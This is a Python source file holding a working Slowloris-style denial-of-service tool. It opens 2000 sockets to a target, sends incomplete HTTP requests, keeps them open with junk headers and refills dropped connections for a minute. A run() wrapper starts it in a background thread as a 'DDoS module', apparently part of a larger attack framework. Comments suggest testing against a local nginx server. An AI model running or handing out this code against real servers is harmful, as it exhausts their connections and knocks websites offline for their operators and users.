###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import sys
import time
import socket
import random
import threading

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

#log_level = 2

#def log(text, level=1):
#    if log_level >= level:
#        print(text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/1234567",
    "Accept-language: en-US,en,q=0.5"
]

def init_socket(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, int(port)))

    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 4000)).encode("utf-8"))

    for header in regular_headers:
        sock.send("{}\r\n".format(header).encode('utf-8'))

    return sock

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def main(ip, port):
    start_time = time.time()
    #ip = sys.argv[1]
    ip = ip
    socket_count = 2000
    #log("Attacking {} with {} sockets".format(ip, socket_count))

    #log("Creating sockets...")
    for i in range(socket_count):
        try:
            #log("Creating socket nr {}".format(i))
            s = init_socket(ip, port)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        end_time = time.time()
        elapsed_time = end_time - start_time
        if (elapsed_time > 60): 
            print("STOP ATTACK!")
            break

        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            #log("Recreating socket...")
            try:
                s = init_socket(ip, port)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(5)

    return 0

# Install the server: sudo apt install nginx
# Start the server (localhost:80): sudo systemctl start nginx.service
# Check the status of the server: systemctl status nginx.service

def run(ip, port):
    print("[+] DDoS module activated...")

    start_time = time.time()
    
    thread = threading.Thread(target=main, args=(ip, port), daemon=True)
    thread.start()

    return_data = "no_data"
    next_action = "instructions"
    return return_data, next_action
